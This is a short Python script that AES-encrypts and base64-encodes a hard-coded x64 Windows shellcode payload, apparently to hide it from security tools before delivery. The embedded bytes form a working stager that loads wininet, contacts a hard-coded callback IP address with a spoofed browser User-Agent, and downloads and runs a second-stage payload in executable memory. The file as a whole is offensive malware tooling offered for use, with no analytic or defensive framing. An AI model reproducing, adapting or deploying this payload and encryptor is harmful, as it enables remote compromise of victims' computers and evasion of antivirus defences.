from Crypto.Cipher import AES
import base64

# Define the key and initialization vector
key = b'38a57032085441e7'
iv = b'x5a3zmi8nr4xa7mr'

# Define the shellcode to be encrypted
shellcode = b"\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x56\x00\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x6a\x49\x37\x73\x00\x80\x85\x04\xc2\x51\x6a\xa0\x84\x5d\x39\xda\xe2\x56\x14\x5e\x8e\xe2\x81\x6f\x17\xf3\x04\x8b\xc5\xbf\x4b\xe0\xc6\x12\xfc\xfe\x06\xb6\x7f\x7e\xb3\x53\x5e\xce\x2e\x26\x61\xc2\x44\x1f\x0a\x1c\x98\x3b\x6f\x25\x50\xf7\xc8\x46\x99\xeb\x78\x89\xc1\x84\xf8\xb8\x38\x45\x18\x79\xd5\xe2\xc4\xad\xea\x69\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x38\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x35\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x34\x2e\x30\x3b\x20\x2e\x4e\x45\x54\x20\x43\x4c\x52\x20\x32\x2e\x30\x2e\x35\x30\x37\x32\x37\x29\x0d\x0a\x00\x60\x8b\x8a\xb0\xe4\x08\x99\xe7\x69\x07\x50\x2c\x91\xcd\x93\x41\x62\x50\x37\xa3\x90\x06\xf7\x88\x5b\x3a\x74\x27\xdb\x7d\xbe\x03\x34\xbb\xa8\xd7\x51\xdd\xd6\x6f\x88\xe3\x23\x0b\x1e\xdc\x1b\xc2\x25\x66\x22\xe0\x3d\xb8\x5e\xc1\xf1\x19\xfa\x26\xfb\xa7\xc8\x4d\x17\x0c\xbd\xb1\x90\xa5\x73\x7d\x33\x88\xb0\x6e\xe2\xe9\x70\x56\x15\xf1\xe9\x83\x8e\x72\x9c\x93\x64\xfa\xe7\x0f\x0c\x74\xeb\x10\xe3\xf9\x8a\xda\x82\x4f\x12\x71\xc6\x28\x1a\x18\x1a\xbc\x46\xaa\xb5\xb3\x45\x5c\xda\x57\x93\x03\xf8\x25\x1b\x43\x5b\xf1\xa7\x08\x62\xed\x26\x28\xfa\x18\xa0\xdf\xa1\xa0\xee\xe2\xd6\x42\x7c\x25\x03\xdf\xe5\x1f\x7c\xc9\xf6\xcd\x10\x63\x55\x16\xfd\xd0\xa0\xc3\x1c\x22\x36\x8b\xc6\xbf\xbf\xa4\x76\xa1\xf9\x2b\xde\xa6\x2a\x99\x7b\xda\x98\xc6\x62\xe8\xf1\x78\x05\xb4\xe2\x87\xef\xe4\x64\x47\x2b\x0c\xf8\xad\xc8\xa7\xb6\xc6\xc7\xaa\xe1\x30\x21\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x32\x31\x37\x2e\x31\x32\x39\x00\x3a\xde\x68\xb1"

# Pad the shellcode to a multiple of 16 bytes
if len(shellcode) % 16 != 0:
    shellcode = shellcode + (b"\x00" * (16 - len(shellcode) % 16))

# Create an AES cipher object
cipher = AES.new(key, AES.MODE_CBC, iv)

# Encrypt the shellcode
encrypted_shellcode = cipher.encrypt(shellcode)

# Encode the encrypted shellcode as base64 for transmission
encoded_encrypted_shellcode = base64.b64encode(encrypted_shellcode)

# Print the encoded encrypted shellcode
print("Encoded Encrypted Shellcode: " + encoded_encrypted_shellcode.decode())
